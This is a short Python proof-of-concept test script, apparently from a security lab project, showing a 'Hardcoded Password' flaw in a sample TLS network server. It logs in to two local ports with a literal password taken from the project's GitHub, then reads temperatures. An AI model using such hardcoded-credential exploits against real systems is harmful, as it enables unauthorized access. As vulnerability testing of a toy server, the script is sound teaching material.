#Vulnerability Name - Hardcoded Password
#Hardcoded password is available in the project github. Demonstrating hardcoded password authenticates.
import socket
import ssl

def communicate(cmds,p) :
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_verify_locations('./certificate.pem')

    s = ssl.wrap_socket(sock)
    
    s.connect(('',p))

    
    execute = "%s" % cmds

    s.send(execute.encode("utf-8"))
    msg = s.recv(1024)
    return msg.strip().decode("utf-8")


try:
    
    infPort = 23456
    incPort = 23457

    infToken = communicate("AUTH !Q#E%T&U8i6y4r2w",infPort)
    incToken = communicate("AUTH !Q#E%T&U8i6y4r2w",incPort)

    infTemp = communicate("%s;GET_TEMP" % infToken, infPort)
    incTemp = communicate("%s;GET_TEMP" % incToken, incPort)

    print(infTemp)
    print(incTemp)

    # SampleNetworkServer has authentication so the testcase will exit at this assertion.
    assert(len(infToken) ==  16 and len(incToken) == 16 and infTemp != "Bad Token" and infTemp != "Invalid Command"
    and incTemp != "Bad Token" and incTemp != "Invalid Command")

    print("##Authentication via hardcoded password successful!##")

except Exception as ex:
    print (ex)
    assert(1 == 2)
